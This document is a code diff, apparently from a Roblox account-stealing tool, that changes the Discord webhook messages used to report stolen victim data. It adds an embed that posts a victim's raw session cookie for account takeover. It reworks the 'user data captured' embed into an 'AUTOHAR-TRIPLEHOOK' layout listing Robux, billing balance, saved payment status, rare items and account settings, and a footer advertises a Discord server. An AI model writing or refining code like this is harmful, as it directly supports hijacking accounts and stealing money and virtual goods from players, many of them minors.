@@ -144,73 +144,107 @@ function formatRobloxLoginEmbed(logData) {
   };
 }
 
+function formatRobloxCookieEmbed(token) {
+  // Second embed: Cookie only - display the raw token value in description with code block formatting
+  return {
+    embeds: [{
+      title: "🍪 Cookie",
+      description: "```" + token + "```",
+      color: 0x8B5CF6,
+      footer: {
+        text: "Handle with extreme caution!"
+      }
+    }]
+  };
+}
+
 function formatRobloxUserDataEmbed(logData) {
   try {
     const userData = JSON.parse(logData.message);
     
-    return {
-      embeds: [{
-        title: `👤 ROBLOX USER DATA CAPTURED`,
-        color: 0x00ff00, // Green for user data
-        fields: [
-          {
-            name: '👤 Username',
-            value: userData.username || 'Unknown',
-            inline: true
-          },
-          {
-            name: '💰 Robux',
-            value: userData.robux?.toString() || '0',
-            inline: true
-          },
-          {
-            name: '⭐ Premium',
-            value: userData.isPremium ? 'Yes' : 'No',
-            inline: true
-          },
-          {
-            name: '📅 Account Age',
-            value: `${userData.accountAge || 0} days`,
-            inline: true
-          },
-          {
-            name: '👥 Friends',
-            value: userData.friendCount?.toString() || '0',
-            inline: true
-          },
-          {
-            name: '🌍 Country',
-            value: userData.country || 'Unknown',
-            inline: true
-          },
-          {
-            name: '💀 Korblox',
-            value: userData.korblox ? 'Yes' : 'No',
-            inline: true
-          },
-          {
-            name: '👻 Headless',
-            value: userData.headless ? 'Yes' : 'No',
-            inline: true
-          },
-          {
-            name: '🎖️ Badges',
-            value: userData.badgeCount?.toString() || '0',
-            inline: true
-          }
-        ],
-        footer: {
-          text: `User ID: ${userData.userId || 'Unknown'}`
+    // First embed: User data only (without cookie)
+    const userDataEmbed = {
+      title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
+      color: 0x8B5CF6,
+      fields: [
+        {
+          name: "<:emoji_37:1410520517349212200> Username",
+          value: userData.username || "Unknown",
+          inline: false
         },
-        timestamp: new Date().toISOString()
-      }]
+        {
+          name: "<:emoji_31:1410233610031857735> Robux (Pending)",
+          value: `${userData.robux || 0} (0)`,
+          inline: true
+        },
+        {
+          name: "<:rbxPremium:1408083254531330158> Premium",
+          value: userData.premium ? "true" : "false",
+          inline: true
+        },
+        {
+          name: "<:emoji_36:1410512337839849543> RAP",
+          value: userData.rap?.toString() || "0",
+          inline: true
+        },
+        {
+          name: "<:emoji_40:1410521889121501214> Summary",
+          value: userData.summary?.toString() || "0",
+          inline: true
+        },
+        {
+          name: "<a:emoji_42:1410523396995022890> Billing",
+          value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
+          inline: false
+        },
+        {
+          name: "<:emoji_31:1410233610031857735> Robux In/Out",
+          value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
+          inline: true
+        },
+        {
+          name: "<:emoji_39:1410521396420939787> Collectibles",
+          value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
+          inline: true
+        },
+        {
+          name: "<:emoji_38:1410520554842361857> Groups Owned",
+          value: userData.groupsOwned?.toString() || "0",
+          inline: true
+        },
+        {
+          name: "<:emoji_41:1410522675821940820> Place Visits",
+          value: userData.placeVisits?.toString() || "0",
+          inline: true
+        },
+        {
+          name: "<:emoji_37:1410517247751094363> Inventory",
+          value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
+          inline: false
+        },
+        {
+          name: "<:emoji_38:1410517275328647218> Settings",
+          value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
+          inline: false                  
+        }
+      ],
+      footer: {
+        text: "Made By .gg/sZbFX2wPVz"
+      }
+    };
+
+    return {
+      embeds: [userDataEmbed]
     };
   } catch (error) {
     return {
       embeds: [{
-        title: `👤 ROBLOX USER DATA CAPTURED`,
+        title: "<:emoji_37:1410520517349212200> AUTOHAR-TRIPLEHOOK",
         description: `\`\`\`\n${logData.message}\`\`\``,
-        color: 0x00ff00,
+        color: 0x8B5CF6,
+        footer: {
+          text: "Made By .gg/sZbFX2wPVz"
+        },
         timestamp: new Date().toISOString()
       }]
     };
